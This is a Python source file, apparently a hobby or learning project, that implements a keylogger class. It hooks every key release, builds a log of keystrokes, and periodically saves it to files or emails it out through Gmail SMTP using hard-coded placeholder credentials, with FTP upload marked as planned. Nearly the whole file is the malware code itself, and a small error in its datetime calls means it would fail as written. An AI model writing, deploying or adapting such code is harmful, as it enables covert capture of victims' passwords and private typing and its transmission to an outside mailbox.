# Create a class which does keylogging for us
# uses the keyboard module, which detects when a key is released
# this data can then be copied to a file or uploaded...etc

import keyboard
import datetime
from smtplib import SMTP
from threading import Thread
from time import sleep
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# global variables
INTERVAL = 60
EMAIL = "test@test.come"
PW = "test"



# should call start function to begin everything
# when running start, best practice to call it in a seperate thread

class keylogger:

    # Currently supports local logs, plans to support ftp and email
    def __init__(self, update_interval, report_method = "local"):

        self.update_interval = update_interval
        self.report_method = report_method

        # variable to contain all the keystrokes in this interval
        self.log = ""

        # we use start and end times as filenames
        self.start_date = datetime.now()
        self.end_date = datetime.now()

    # https://github.com/boppreh/keyboard#keyboard.on_release_key
    # https://github.com/boppreh/keyboard#keyboard.hook


    def start(self):
        self.start_date = datetime.now()
        keyboard.on_release(callback = self.callback)
        
        thread = Thread(target = self.report)
        thread.start()
        
        while True:
            sleep(0.1)

    def callback(self, event):
        # callback is called when a key is released
        # event is defined as an attribute "name"

        key = event.name

        if len(key) > 1:
            # is a special character i.e (alt, ctrl, etc)
            # specifically this is to ensure only characters are in log files
            if key == "space":
                key = " "

            elif key == "enter":
                key = "[ENTER]\n"

            elif key == "decimal":
                key = "."

            else:
                # replace spaces with underscores
                key = key.replace(" ", "_")
                key = f"[{key.upper()}]"
        # append key to global log
        self.log += key

    # local file functions for saving keylogs locally
    def assign_filename(self):
         # construct the filename to be identified by start & end datetimes
        start_date_str = str(self.start_date)[:-7].replace(" ", "-").replace(":", "")
        end_date_str = str(self.end_date)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_date_str}_{end_date_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"sample_logs/{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)

        print(f"[+] Saved {self.filename}.txt")
    

    # Email function
    def report_to_email(self):
        message = MIMEMultipart()
        message['From'] = EMAIL
        message['To'] = EMAIL
        message['Subject'] = 'Log Data from Key Logger'
        message.attach(MIMEText(self.log, 'plain'))

        with SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL, PW)
            server.sendmail(EMAIL,EMAIL, message.as_string())




    def report(self):
        while True:
            if self.log:
                self.end_date = datetime.now()
                self.assign_filename()

                # to implement new reporting methods add here:
                if self.report_method == "local":
                    self.report_to_file()

                elif self.report_method == "email":
                    self.report_to_email()

                elif self.report_method == "ftp": # to be implemented
                    pass


                # reset variables
                self.start_date = datetime.now()
            
            self.log = ""
            
            t = self.update_interval

            # this is interval periods, could implement this in threads so the load is more balanced
            while t != 0:
                t -= 1
                sleep(1)


if __name__ == "__main__":
    logger = keylogger(INTERVAL, "local")
    logger.start()